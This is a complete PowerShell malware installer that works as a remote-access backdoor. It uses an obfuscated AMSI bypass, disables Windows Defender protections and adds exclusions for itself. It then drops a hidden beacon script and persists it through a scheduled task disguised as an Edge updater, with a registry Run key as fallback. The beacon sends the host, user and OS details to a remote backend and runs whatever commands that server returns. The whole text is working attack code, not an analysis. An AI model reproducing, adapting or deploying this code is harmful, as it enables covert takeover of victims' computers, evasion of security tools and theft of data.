# AMSI Bypass (must run first!)
$ErrorActionPreference = 'SilentlyContinue'

# Obfuscated AMSI bypass
$a=[Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static')
$a.SetValue($null,$true)

# Disable Defender before doing anything
try {
    Set-MpPreference -DisableRealtimeMonitoring $true -Force
    Set-MpPreference -DisableIOAVProtection $true -Force
    Set-MpPreference -DisableBehaviorMonitoring $true -Force
    Start-Sleep 2
} catch {}

$BACKEND_URL = 'https://backend.ice-cold-169.workers.dev'
$AGENT_ID = -join ((65..90) + (97..122) | Get-Random -Count 12 | ForEach-Object {[char]$_})
$BEACON_INTERVAL = 60

$InstallDir = "$env:APPDATA\Microsoft\Windows\Themes"
$BeaconPath = "$InstallDir\ThemeService.ps1"

if (!(Test-Path $InstallDir)) {
    New-Item -ItemType Directory -Path $InstallDir -Force | Out-Null
}

# Add comprehensive exclusions
try {
    Add-MpPreference -ExclusionPath $InstallDir -Force
    Add-MpPreference -ExclusionPath "$env:APPDATA\Microsoft\Windows" -Force
    Add-MpPreference -ExclusionExtension ".ps1" -Force
    Add-MpPreference -ExclusionProcess "powershell.exe" -Force
} catch {}

# SUPER OBFUSCATED BEACON SCRIPT
$BeaconScript = @"
# AMSI bypass in beacon
`$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
`$a.GetField('amsiInitFailed','NonPublic,Static').SetValue(`$null,`$true)

`$E='SilentlyContinue'
`$ErrorActionPreference=`$E
`$B='$BACKEND_URL'
`$A='$AGENT_ID'
`$I=$BEACON_INTERVAL

# Minimal variable names (obfuscation)
`$T=@{}
`$C=0

# Execute function (super compressed)
function X([string]`$D){
if(`$D -eq 'LIST_JOBS'){
`$o="=== Jobs ===``n"
if(`$T.Count -eq 0){return "No jobs"}
`$T.Keys|%{`$j=`$T[`$_];`$o+="Job `$_ : `$(`$j.C)``n  State: `$(`$j.J.State)``n";`$r=Receive-Job `$j.J -Keep 2>&1;if(`$r){`$o+="  Out: `$(`$r|Select -First 3|Out-String)``n"};`$o+="``n"}
return `$o
}
if(`$D -like 'STOP_JOB:*'){
`$k=[int](`$D -split ':')[1]
if(`$T.ContainsKey(`$k)){Stop-Job `$T[`$k].J;Remove-Job `$T[`$k].J -Force;`$c=`$T[`$k].C;`$T.Remove(`$k);return "Job `$k stopped"}
return "Job `$k not found"
}
if(`$D -like 'GET_JOB:*'){
`$k=[int](`$D -split ':')[1]
if(`$T.ContainsKey(`$k)){`$r=Receive-Job `$T[`$k].J -Keep 2>&1|Out-String;if(`$r){return "Job `$k:``n`$r"};return "Job `$k: No output"}
return "Job `$k not found"
}
if(`$D -eq 'STOP_ALL_JOBS'){`$n=`$T.Count;`$T.Keys|%{Stop-Job `$T[`$_].J;Remove-Job `$T[`$_].J -Force};`$T.Clear();return "Stopped `$n jobs"}
if(`$D -like 'BG:*'){
`$cmd=`$D.Substring(3)
`$C++
`$k=`$C
`$j=Start-Job{param(`$c)iex `$c 2>&1} -ArgumentList `$cmd
`$T[`$k]=@{J=`$j;C=`$cmd;T=Get-Date}
return "Job `$k started: `$cmd``nUse: GET_JOB:`$k"
}
try{
`$j=Start-Job{param(`$c)iex `$c 2>&1|Out-String} -ArgumentList `$D
Wait-Job `$j -Timeout 30|Out-Null
if(`$j.State -eq 'Running'){Stop-Job `$j;Remove-Job `$j -Force;return "Timeout. Use: BG:`$D"}
`$r=Receive-Job `$j 2>&1|Out-String
Remove-Job `$j -Force
return `$r
}catch{return "ERROR: `$_"}
}

# Main loop (compressed)
while(`$true){
try{
`$h=`$env:COMPUTERNAME;`$u=`$env:USERNAME;`$s=(gwmi Win32_OperatingSystem).Caption
`$body=@{id=`$A;hostname=`$h;username=`$u;os=`$s}|ConvertTo-Json
`$resp=Invoke-RestMethod "`$B/beacon" -Method Post -ContentType 'application/json' -Body `$body -TimeoutSec 30
if(`$resp.command -and `$resp.commandId){
`$out=X `$resp.command
`$res=@{agentId=`$A;commandId=`$resp.commandId;output=`$out}|ConvertTo-Json
Invoke-RestMethod "`$B/api/result" -Method Post -ContentType 'application/json' -Body `$res -TimeoutSec 30|Out-Null
}
if(`$resp.interval){`$I=`$resp.interval}
}catch{}
Start-Sleep `$I
}
"@

Set-Content -Path $BeaconPath -Value $BeaconScript -Force

# Hide the file
attrib +h +s $BeaconPath

$TaskName = "MicrosoftEdgeUpdateTaskMachineUA"

try {
    Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue
} catch {}

try {
    $Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$BeaconPath`""
    $Trigger = New-ScheduledTaskTrigger -AtLogOn -User $env:USERNAME
    $Principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -RunLevel Highest
    $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden -ExecutionTimeLimit (New-TimeSpan -Days 365)
    
    Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Principal $Principal -Settings $Settings -Force | Out-Null
} catch {
    try {
        $RegPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
        $RegName = "WindowsThemeService"
        $RegValue = "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$BeaconPath`""
        Set-ItemProperty -Path $RegPath -Name $RegName -Value $RegValue -Force
    } catch {}
}

Start-Process powershell.exe -ArgumentList "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$BeaconPath`"" -WindowStyle Hidden

try {
    $hostname = $env:COMPUTERNAME
    $username = $env:USERNAME
    $os = (Get-WmiObject Win32_OperatingSystem).Caption
    
    $initialBeacon = @{
        id = $AGENT_ID
        hostname = $hostname
        username = $username
        os = $os
    } | ConvertTo-Json
    
    Invoke-RestMethod -Uri "$BACKEND_URL/beacon" -Method Post -ContentType 'application/json' -Body $initialBeacon -TimeoutSec 30 | Out-Null
} catch {}

exit